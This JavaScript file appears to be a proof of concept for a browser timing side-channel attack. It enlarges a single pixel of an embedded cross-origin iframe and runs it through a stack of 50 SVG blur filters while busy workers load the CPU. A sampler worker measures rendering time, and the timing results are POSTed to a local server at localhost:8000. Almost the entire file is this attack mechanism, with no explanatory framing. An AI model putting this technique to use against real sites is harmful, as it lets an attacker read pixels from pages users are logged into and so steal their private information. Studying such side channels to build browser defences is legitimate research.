const IMAGE_SIZE = 2000
const SQUARE_SIZE = IMAGE_SIZE / 100

function createFilterStack() {
    const defs = document.querySelector('defs');

    const filterStack = document.createElementNS("http://www.w3.org/2000/svg", "filter");
    filterStack.setAttribute("id", "filter-stack");
    filterStack.setAttribute("x", "0");
    filterStack.setAttribute("y", "0");
    filterStack.setAttribute("width", "100%");
    filterStack.setAttribute("height", "100%");

    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    // Make random noise image
    for (let y = 0; y < IMAGE_SIZE; y += SQUARE_SIZE) {
        for (let x = 0; x < IMAGE_SIZE; x += SQUARE_SIZE) {            
            ctx.fillStyle = `rgb(${Math.floor(Math.random() * 255)} ${Math.floor(Math.random() * 255)} ${Math.floor(Math.random() * 255)})`;
            ctx.fillRect(x, y, SQUARE_SIZE, SQUARE_SIZE);
        }
    }

    const noiseImage = document.createElementNS("http://www.w3.org/2000/svg", 'feImage');
    noiseImage.setAttribute("href", canvas.toDataURL());
    noiseImage.setAttribute("result", "noise-image");

    const feComposite = document.createElementNS("http://www.w3.org/2000/svg", "feComposite");
    feComposite.setAttribute("in", "SourceGraphic");
    feComposite.setAttribute("in2", "noise-image");
    feComposite.setAttribute("operator", "arithmetic");
    feComposite.setAttribute("k1", "0.98");
    feComposite.setAttribute("k2", "0");
    feComposite.setAttribute("k3", "0.01");
    feComposite.setAttribute("k4", "0");
    feComposite.setAttribute("result", "composed-image");

    filterStack.appendChild(noiseImage);
    filterStack.appendChild(feComposite);

    let gaussBlur = document.createElementNS("http://www.w3.org/2000/svg", "feGaussianBlur");
    gaussBlur.setAttribute("in", "composed-image");
    gaussBlur.setAttribute("stdDeviation", "0.999");
    gaussBlur.setAttribute("result", "blur0")
    filterStack.appendChild(gaussBlur);

    // Apply Gaussian Blur filter in a chain
    for (let i = 1; i <= 50; i++) {
        let gaussBlur = document.createElementNS("http://www.w3.org/2000/svg", "feGaussianBlur");
        gaussBlur.setAttribute("in", "blur" + (i-1));
        gaussBlur.setAttribute("stdDeviation", "0.999");
        gaussBlur.setAttribute("result", "blur" + i)
        filterStack.appendChild(gaussBlur);
    }

    defs.appendChild(filterStack);
}

function applyFilter() {
    const iframe = document.getElementById("target-iframe");

    iframe.style.clipPath = `inset(0px ${IMAGE_SIZE-1}px ${IMAGE_SIZE-1}px 0px)`;
    iframe.style.transformOrigin = `0px 0px`;
    iframe.style.transform = `scale(${IMAGE_SIZE})`;

    const div = document.getElementById("target-pixel");

    div.style.filter = "url(#filter-stack)";
}

function clearFilter() {
    const filterStack = document.getElementById("filter-stack");
    filterStack.remove();
}

function animateFrame() {
    clearFilter();
    createFilterStack();
    applyFilter();
    requestAnimationFrame(animateFrame);
}

function startRun() {
    const samplerWorker = new Worker('sampler.js');

    createFilterStack();
    applyFilter();

    requestAnimationFrame(animateFrame);

    samplerWorker.postMessage(20000);

    samplerWorker.onmessage = function(event) {
        let res = new Promise((res, rej) => {
            fetch("http://localhost:8000/api", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(event.data)
            }).then(res)
        });
        res.then(() => {
            samplerWorker.terminate();
            clearFilter();
            window.close();
            return;
        });
    }
}

let busyWorkers = [];

for (let i = 0; i < 14; i++) {
    const busyWorker = new Worker("busy.js");
    busyWorkers.push(busyWorker);
}

busyWorkers.forEach(busyWorker => {
    busyWorker.postMessage(1234);
});

startRun();